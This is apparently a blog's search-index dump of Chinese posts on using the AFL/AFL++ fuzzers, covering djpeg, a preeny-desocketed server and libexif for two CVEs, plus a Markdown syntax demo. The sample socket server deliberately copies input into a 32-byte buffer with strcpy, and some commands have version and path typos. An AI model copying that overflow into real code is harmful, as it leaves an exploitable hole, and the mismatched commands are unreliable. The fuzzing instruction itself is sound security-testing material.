afl-fuzz是真正进行fuzz的程序，通过afl-fuzz help可以查看支持的所有选项（其它命令也可以），选项如下 afl-fuzz 2.56b by \u003clcamtuf@google.com\u003e afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parameters（必须参数）: -i dir - input directory with test cases - 存放样本的目录 -o dir - output directory for fuzzer findings - fuzz输出的数据存放目录 Execution control settings（扩展控制设置）: -f file - location read by the fuzzed program (stdin) - 指定编译文件的文件扩展名 -t msec - timeout for each run (auto-scaled, 50-1000 ms) - 指定程序超时时间 -m megs - memory limit for child process (50 MB) - 限制子进程使用的内存 -Q - use binary-only instrumentation (QEMU mode) - 使用qemu-mode进行二进制插桩 Fuzzing behavior settings（设置编译操作）: -d - quick \u0026 dirty mode (skips deterministic steps) - 不进行确定性变异，只进行随机性变异 -n - fuzz without instrumentation (dumb mode) - 不进行随机性编译，只进行确定性变异 -x dir - optional fuzzer dictionary (see README) - dictionary使用的用户指定token存放的目录 Other stuff（其他选项）: -T text - text banner to show on the screen - 在屏幕上显示的banner信息 -M / -S id - distributed mode (see parallel_fuzzing.txt) - 并行fuzz， —M为主节点，-S为子节点 -C - crash exploration mode (the peruvian rabbit thing) - 分析崩溃模式 For additional tips, please consult /usr/local/share/doc/afl/README. # 和`afl-cmin`、`afl-tmin`相同，默认向标准输入fuzz数据，如果被fuzz指令是从参数指定文件中读取数据，则使用`@@`替换文件参数 # 官方详细说明可以在项目根目录的'README.md'文件中查看 对已经进行过源码插桩的程序，基本指令为： afl-fuzz -i in_dir -o out_dir -- /path/to/fuzzed_app [ ... ] 对没有进行过源代码插桩的程序，基本指令为： afl-fuzz -i in_dir -o out_dir -Q -- /path/to/fuzzed_app [ ... ] afl-fuzz的运行特点是，不管系统真实为多少核，只使用其中一个，所以只运行一个fuzz进程会发现CPU使用率不高。不过afl-fuzz提供了并行fuzz的选项，并行运行时基本指令为： afl-fuzz -i in_dir -o out_dir [-Q] -M mast_name -- /path/to/fuzzed_app [ ... ] afl-fuzz -i in_dir -o out_dir [-Q] -S slave_name1 -- /path/to/fuzzed_app [ ... ] afl-fuzz -i in_dir -o out_dir [-Q] -S s","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"2. 基本使用样例 （注：测试过程中因为我安装了多个版本的afl和afl++，所以有些地方使用的是绝对路径，在只有单版本单环境变量的情况下，可以使用相对路径） 以djpeg程序为例进行，该程序可通过apt-get install libjpeg-progs进行安装，安装后直接就是二进制程序，所以使用的指令都带有-Q选项，如果要fuzz的程序编译时使用的是afl-gcc、afl-g++、afl-clang、afl-clang++、afl-clang-fast、afl-clang-fast++这些指令，fuzz的大致流程类似，只需要将命令中的-Q选项去掉即可。 通过 whereis djpeg 指令查看 djpeg 的绝对路径，一般情况下路径为 /usr/bin/djpeg whereis djpeg 创建两个目录 in_dir 和 out_dir ，分别用于存放我们输入的样本和afl的fuzz结果 mkdir in_dir mkdir out_dir 向 in_dir 中放入样本，这些样本可以自行收集，不过样本文件需要尽量小，否则变异阶段会花费较多时间，降低效率，这里我输入两个样本 1 和 2 ，内容分别为 hello 和 test，在准备一个很小的图片文件（可通过绘图工具截下一小块，以jpeg形式保存即可），命名为3放入样本目录中 echo 'hello' \u003e in_dir/1 echo 'test' \u003e in_dir/2 使用 afl-cmin 对输入样本集合进行裁剪，先创建一个输出目录 in_dir_min ，然后执行裁剪指令 mkdir in_dir_min afl-cmin -i in_dir -o in_dir_min -Q -- /usr/bin/djpeg @@ 裁剪过后目录中只保留了2 和 3. 使用 afl-tmin 对裁剪后集合中所有的样本进行大小裁剪（该步骤产生的裁剪后样本不一定要使用，需要通过 afl-analyze 指令进行裁剪前后对比分析，自行判断使用哪一个，裁剪前后两个样本一定只保留一个放入最终样本集中） afl-tmin -i in_dir_min/2 -o in_dir_min/2_min -Q -- /usr/bin/djpeg @@ afl-tmin -i in_dir_min/3 -o in_dir_min/3_min -Q -- /usr/bin/djpeg @@ 裁剪后得到的内容如下： 使用 afl-analyze 分别对裁剪前后的样本进行分析，先对比分析 3 和 3_min afl-analyze -i in_dir_min/3 -Q -- /usr/bin/djpeg @@ afl-analyze -i in_dir_min/3_min -Q -- /usr/bin/djpeg @@ 首先是对3的分析： 然后是对3_min的分析： afl-tmin 裁剪时遵循的是执行路径不变原则，但是也有可能破坏原文件中对某些标志数据，就如同上图 3 和 3_min 分析的结果，afl在识别文件结构时， 3 和 3_min 是不同的，这个不同会导致后续fuzz时变异阶段的不同，所以我认为在这种情况下 3_min 不能完全取代 3 。 再对比下 2 和 2_min afl-analyze -i in_dir_min/2 -Q -- /usr/bin/djpeg @@ afl-analyze -i in_dir_min/2_min -Q -- /usr/bin/djpeg @@ 同理，对比这两个样本，进行取舍。 最终，选取 2 和 3 作为最终样本集，即未进行 afl-tmin 裁剪的样本，放入新建的 in 目录中 mkdir in cp in_dir_min/2 in cp in_dir_min/3 in 使用 afl-fuzz 进行fuzz，这里采用并行fuzz模式，指令如下 afl-fuzz -i in -o out_dir -Q -M djpeg_master -- /usr/bin/djpeg @@ # 另一个终端 afl-fuzz -i in -o out_dir -Q -S djpeg_slaver_1 -- /usr/bin/djpeg @@ 至此，最基本的使用 afl 就差不多了，后续就是等待出现崩溃，分析崩溃了。 ","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"3. 运行状态说明 上面已经给出了AFL的运行时的状态图，官方对该界面的说明在 https://github.com/google/AFL/blob/master/docs/status_screen.txt ，或者在项目 docs/status_screen.txt 中查看。 下面对界面中各个部分做简单说明： Process timing：Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间； Overall results：Fuzzer当前状态的概述； Cycle progress：我们输入队列的距离； Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节； Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度； Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息； Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息； Path geometry：有关Fuzzer找到的执行路径的信息； CPU004：CPU利用率。 fuzz结果查看 单进程下fuzz结果的输出目录包含以下几个： crashes：存放去重后触发crash的数据 fuzz_bitmap：记录代码覆盖率 fuzzer_stats：fuzz状态 hangs：存放去重后触发挂起的数据 plot_data：绘图数据 queue：有效的样本集合 queque 目录下存放着有效的样本集合，我们可以从目录中文件的文件名得知样本是如何产生的，比如下图中 文件名中包含一些说明性字段： id：样本id orig：来自用户指定的样本集合，内容和对应的源样本一样 src：从哪些样本id变异而来 op：从变异的哪个阶段产生的 这样就可以得知有效样本的来源。 crashes 目录下存放着去重后触发崩溃的输入，我们可以从目录中文件的文件名得知数据是如何产生的，比如下图中 字段含义和 queque 目录中文件名基本一致。 ","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:3","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"4. 进阶使用 1. 使用AFL对端口程序进行fuzz 截止到目前为止，绝大多数的程序都是将‘标准输入’、‘参数指定文件中的数据’以及‘端口接收的数据’作为输入。前两者 afl 都可以很好的处理，但是不支持将变异数据输入到端口中，为了对这类程序进行fuzz，这里介绍一种不管有无源码都可以进行fuzz的方法。 这里使用preeny项目来进行测试，其中包含一些重写的系统库，在这里的测试中主要会使用重写的网络程序库，以实现从socket读取输入转为从标准输入读取输入。安装过程十分简单，进入项目主目录后，执行make进行变异，查看 x86_64-linux-gnu 下是否生成 .so 库文件即可。 这个库利用 LD_PRELOAD 机制，重写了很多库函数，其中 desock.c 这个文件负责重写 socket 相关的函数，其实现的功能就是当应用从 socket 获取输入时，改为从 stdin 获取输入。 首先准备一个socket程序，这里使用如下代码为例，文件名为 socket.c #include\u003cstdio.h\u003e#include\u003cstdlib.h\u003e#include\u003cstring.h\u003e#include\u003cunistd.h\u003e#include\u003csys/socket.h\u003e#include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } 使用 gcc 进行编译 gcc -o socket socket.c 运行 socket 可以监听 8000 端口进行socket通信 通过设置 LD_PRELOAD 使程序加载 preeny 项目中编译出来的 desock.so 库（一般在 preeny 项目下的 x86_64-linux-gnu 目录中）来改变socket通信，具体指令如下（我的 desock.so 路径为 /root/Tools/preeny/x86_64-linux-gnu/desock.so） # 指令格式： LD_PRELOAD=\"preeny编译出的desock.so的路径\" socket程序 [参数] LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" ./socket 最终实现的结果如下： 从上面的结果可以看到 send 函数成功将消息发往了 stdout，recv 函数也成功从 stdin 中接收了消息。 这样就将 socket 输入转变为了标准输入，进而可以使用afl进行fuzz了。过程如下： # 创建样本及输出目录 mkdir in mkdir out # 创建样本 echo 'test 123' \u003e in/test echo 'xxx' \u003e in/xxx echo 'help' \u003e in/help echo 'exit' \u003e in/exit # 对样本进行裁剪 mkdir in_min LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" afl-cmin -i in -o in_min -Q -- ./socket # 开始fuzz LD_PRELOAD=\"/home/v4ler1an/Desktop/Fuzz/training/preeny/x86_64-linux-gnu/desock.so\" afl-fuzz -i in_min/ -o out/ -Q -- ./socket 成功执行后如下： 从上面的结果可以看出这种方式存在的问题： fuzz效率很低 如果socket程序是循环接收数据的，因为fuzz只能对程序进行一次输入，所以被fuzz程序在处理完这个输入后会一直保持等待，最终导致超时，而afl对超时的处理可以简单理解为忽略，所以针对这种socket程序是无法进行fuzz的，实战中绝大多数都是循环接收数据的程序，所以这种方案实际的可行性有待考虑。 2. 使用llvm模式进行fuzz 因为使用这个模式需要修改源代码，所以只有对有源码的程序进行fuzz时才能使用。 可在项目 llvm_mode 目录下的 README.llvm 文件中查看官方文档 将上面的代码改成循环读取的形式，新代码如下： #include\u003cstdio.h\u003e#include\u003cstdlib.h\u003e#include\u003cstring.h\u003e#include\u003cunistd.h\u003e#include\u003csys/socket.h\u003e#include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); while(1){ cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(conn","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:4","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"四、总结 以上为AFL的基本知识和基本使用方法，仍然属于比较基层的内容，后续将进行源码分析和更多的实例训练的相关内容。 ","date":"2020-12-02","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:4:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 2","date":"2020-12-01","objectID":"/fuzzing101-2/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"本文是Fuzzing101系列第二篇，fuzz的对象为libexif库。 ","date":"2020-12-01","objectID":"/fuzzing101-2/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics libexif CVE-2009-3895, CVE-2012-2836 3hous aft-clang-lto, fuzz libraries, Eclipse IDE CVE-2009-3895: heap-based buffer overflow vulnerability. CVE-2012-2836: out-of-bounds read vulnerability. ","date":"2020-12-01","objectID":"/fuzzing101-2/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"2. Learning Target 如何对使用了外部库的应用进行fuzz 使用 afl-clang-lto 进行fuzz，它比 afl-clang-fast 的速度更快 使用 Eclipse IDE进行动态调试 ","date":"2020-12-01","objectID":"/fuzzing101-2/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2020-12-01","objectID":"/fuzzing101-2/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Workflow 寻找使用了 libexif 库的应用接口 创建 exif 样例的种子语料库 使用 afl-clang-lto 编译 libexif 和选择的应用程序 对 libexif 进行fuzz 对 crash 进行分类过滤，确认每个漏洞的 PoC 修复漏洞 ","date":"2020-12-01","objectID":"/fuzzing101-2/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待fuzz的 libexif 环境，进行编译待用： # download wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz tar -xzvf libexif-0_6_15-release.tar.gz # build and install libexif cd libexif-libexif-0_6_15-release/ sudo apt install autopoint libtool gettext libpopt-dev autoreconf -fvi ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_libexif/install/\" make make install # choosing an interface application wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz tar -xzvf exif-0_6_15-release.tar.gz # build and install exif command-line utility cd .. cd exif-exif-0_6_15-release/ autoreconf -fvi ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/traning/fuzzing_libexif/install/\" PKG_CONFIG_PATH=$HOME/Desktop/Fuzz/traning/fuzzing_libexif/install/lib/pkgconfig make make install 备注：这里的libexif的版本最好选用 0_6_15 版本，14的版本make install会一直报错，而且没有出现过官方issue。为节省时间，更换了版本。 2. Seed corpus creation 创建种子语料库，这里选用的是github上公开的一个exif的样例库：https://github.com/ianare/exif-samples。 # download and unzip cd $HOME/Desktop/Fuzz/training/fuzzing_libexif wget https://github.com/ianare/exif-samples/archive/refs/heads/master.zip unzip master.zip 安装完成后，使用 exif 检测一下样本，可以成功识别即可。 3. aft-clang-lto instrumentation 使用 afl-clang-lto 重新对 libexif 和 exif 进行编译： # recompile libexif with afl-clang-lto rm -r $HOME/Desktop/Fuzz/training/fuzzing_libexif/install cd $HOME/Desktop/Fuzz/training/fuzzing_libexif/libexif-libexif-0_6_15-release/ make clean export LLVM_CONFIG=\"llvm-config-12\" # llvm-config-version at least is 11 CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_libexif/install/\" make make install # recompile exif with afl-clang-lto cd $HOME/fuzzing_libexif/exif-exif-0_6_15-release make clean export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/fuzzing_libexif/install/\" PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig make make install 4. Start fuzz 编译完成后，可以使用afl++在 afl-clang-lto 模式下开始进行fuzz： afl-fuzz -i $HOME/Desktop/Fuzz/training/fuzzing_libexif/exif-samples-master/jpg/ -o $HOME/Desktop/Fuzz/training/fuzzing_libexif/out/ -s 123 -- $HOME/Desktop/Fuzz/training/fuzzing_libexif/install/bin/exif @@ ","date":"2020-12-01","objectID":"/fuzzing101-2/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"3. Crashes 最终跑得的结果如下（因为自动跑的，所以cycle超了）： ","date":"2020-12-01","objectID":"/fuzzing101-2/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"4. Debug ","date":"2020-12-01","objectID":"/fuzzing101-2/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Eclipse setup # install java sudo apt install default-jdk # download and run Eclipse wget https://download.eclipse.org/technology/epp/downloads/release/2021-06/R/eclipse-cpp-2021-06-R-linux-gtk-x86_64.tar.gz tar -zxvf eclipse-cpp-2021-06-R-linux-gtk-x86_64.tar.gz 解压完成后，进入文件夹，运行 eclipse 即可。 导入项目：选择 File -\u003e Import  ， 然后选择 C/C++ 里的 Existing code as makefile project 。然后选择 Linux GCC ，并选择代码路径。 调试：选择 run -\u003e Debug Configurations，然后选择exif项目并且选定exif 可执行程序，然后设置 Arguments 中为crash 的绝对路径名，最后点击 Debug 即可。调试过程中，直接 F8 或者 run -\u003e Resume 可以直接来到crash 现场。 2. Eclipse crash debug 最后就是使用Eclipse进行crash的debug了，这个就不做记录了，需要花时间调试每个crash文件。 ","date":"2020-12-01","objectID":"/fuzzing101-2/:4:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 2","uri":"/fuzzing101-2/"},{"categories":["Markdown"],"content":"这篇文章展示了基本的 Markdown 语法和格式.","date":"2019-12-01","objectID":"/basic-markdown-syntax/","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"这篇文章提供了可以在 Hugo 的文章中使用的基本 Markdown 语法示例. 注意 这篇文章借鉴了一篇很棒的来自 Grav 的文章. 如果你想了解 Loveit 主题的扩展 Markdown 语法, 请阅读扩展 Markdown 语法页面. 事实上, 编写 Web 内容很麻烦. WYSIWYG所见即所得 编辑器帮助减轻了这一任务. 但通常会导致代码太糟, 或更糟糕的是, 网页也会很丑. 没有通常伴随的所有复杂和丑陋的问题, Markdown 是一种更好的生成 HTML 内容的方式. 一些主要好处是: Markdown 简单易学, 几乎没有多余的字符, 因此编写内容也更快. 用 Markdown 书写时出错的机会更少. 可以产生有效的 XHTML 输出. 将内容和视觉显示保持分开, 这样就不会打乱网站的外观. 可以在你喜欢的任何文本编辑器或 Markdown 应用程序中编写内容. Markdown 使用起来很有趣! John Gruber, Markdown 的作者如是说: Markdown 格式的首要设计目标是更具可读性. 最初的想法是 Markdown 格式的文档应当以纯文本形式发布, 而不会看起来像被标签或格式说明所标记. 虽然 Markdown 的语法受到几种现有的文本到 HTML 转换工具的影响, 但 Markdown 语法的最大灵感来源是纯文本电子邮件的格式. – John Gruber 话不多说, 我们来回顾一下 Markdown 的主要语法以及生成的 HTML 样式! 技巧  将此页保存为书签，以备将来参考! ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:0:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"1 标题 从 h2 到 h6 的标题在每个级别上都加上一个 ＃: ## h2 标题 ### h3 标题 #### h4 标题 ##### h5 标题 ###### h6 标题 输出的 HTML 看起来像这样: \u003ch2\u003eh2 标题\u003c/h2\u003e \u003ch3\u003eh3 标题\u003c/h3\u003e \u003ch4\u003eh4 标题\u003c/h4\u003e \u003ch5\u003eh5 标题\u003c/h5\u003e \u003ch6\u003eh6 标题\u003c/h6\u003e 标题 ID 要添加自定义标题 ID, 请在与标题相同的行中将自定义 ID 放在花括号中: ### 一个很棒的标题 {#custom-id} 输出的 HTML 看起来像这样: \u003ch3 id=\"custom-id\"\u003e一个很棒的标题\u003c/h3\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:1:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"2 注释 注释是和 HTML 兼容的： \u003c!-- 这是一段注释 --\u003e 不能看到以下的注释: ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:2:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"3 水平线 HTML 中的 \u003chr\u003e 标签是用来在段落元素之间创建一个 “专题间隔” 的. 使用 Markdown, 你可以用以下方式创建一个 \u003chr\u003e 标签: ___: 三个连续的下划线 ---: 三个连续的破折号 ***: 三个连续的星号 呈现的输出效果如下: ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:3:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"4 段落 按照纯文本的方式书写段落, 纯文本在呈现的 HTML 中将用 \u003cp\u003e/\u003c/p\u003e 标签包裹. 如下段落: Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad. 输出的 HTML 看起来像这样: \u003cp\u003eLorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.\u003c/p\u003e 可以使用一个空白行进行换行. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:4:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"5 内联 HTML 元素 如果你需要某个 HTML 标签 (带有一个类), 则可以简单地像这样使用: Markdown 格式的段落. \u003cdiv class=\"class\"\u003e 这是 \u003cb\u003eHTML\u003c/b\u003e \u003c/div\u003e Markdown 格式的段落. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:5:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"6 强调 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"加粗 用于强调带有较粗字体的文本片段. 以下文本片段会被 渲染为粗体. **渲染为粗体** __渲染为粗体__ 输出的 HTML 看起来像这样: \u003cstrong\u003e渲染为粗体\u003c/strong\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:1","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"斜体 用于强调带有斜体的文本片段. 以下文本片段被 渲染为斜体. *渲染为斜体* _渲染为斜体_ 输出的 HTML 看起来像这样: \u003cem\u003e渲染为斜体\u003c/em\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:2","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"删除线 按照 GFMGitHub flavored Markdown 你可以使用删除线. ~~这段文本带有删除线.~~ 呈现的输出效果如下: 这段文本带有删除线. 输出的 HTML 看起来像这样: \u003cdel\u003e这段文本带有删除线.\u003c/del\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:3","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"组合 加粗, 斜体, 和删除线可以 组合使用. ***加粗和斜体*** ~~**删除线和加粗**~~ ~~*删除线和斜体*~~ ~~***加粗, 斜体和删除线***~~ 呈现的输出效果如下: 加粗和斜体 删除线和加粗 删除线和斜体 加粗, 斜体和删除线 输出的 HTML 看起来像这样: \u003cem\u003e\u003cstrong\u003e加粗和斜体\u003c/strong\u003e\u003c/em\u003e \u003cdel\u003e\u003cstrong\u003e删除线和加粗\u003c/strong\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e删除线和斜体\u003c/em\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e\u003cstrong\u003e加粗, 斜体和删除线\u003c/strong\u003e\u003c/em\u003e\u003c/del\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:6:4","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"7 引用 用于在文档中引用其他来源的内容块. 在要引用的任何文本之前添加 \u003e: \u003e **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 呈现的输出效果如下: Fusion Drive combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 输出的 HTML 看起来像这样: \u003cblockquote\u003e \u003cp\u003e \u003cstrong\u003eFusion Drive\u003c/strong\u003e combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. \u003c/p\u003e \u003c/blockquote\u003e 引用也可以嵌套: \u003e Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. \u003e\u003e Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. 呈现的输出效果如下: Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:7:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"8 列表 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:8:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"无序列表 一系列项的列表, 其中项的顺序没有明显关系. 你可以使用以下任何符号来表示无序列表中的项: * 一项内容 - 一项内容 + 一项内容 例如: * Lorem ipsum dolor sit amet * Consectetur adipiscing elit * Integer molestie lorem at massa * Facilisis in pretium nisl aliquet * Nulla volutpat aliquam velit * Phasellus iaculis neque * Purus sodales ultricies * Vestibulum laoreet porttitor sem * Ac tristique libero volutpat at * Faucibus porta lacus fringilla vel * Aenean sit amet erat nunc * Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Phasellus iaculis neque Purus sodales ultricies Vestibulum laoreet porttitor sem Ac tristique libero volutpat at Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: \u003cul\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit \u003cul\u003e \u003cli\u003ePhasellus iaculis neque\u003c/li\u003e \u003cli\u003ePurus sodales ultricies\u003c/li\u003e \u003cli\u003eVestibulum laoreet porttitor sem\u003c/li\u003e \u003cli\u003eAc tristique libero volutpat at\u003c/li\u003e \u003c/ul\u003e \u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ul\u003e 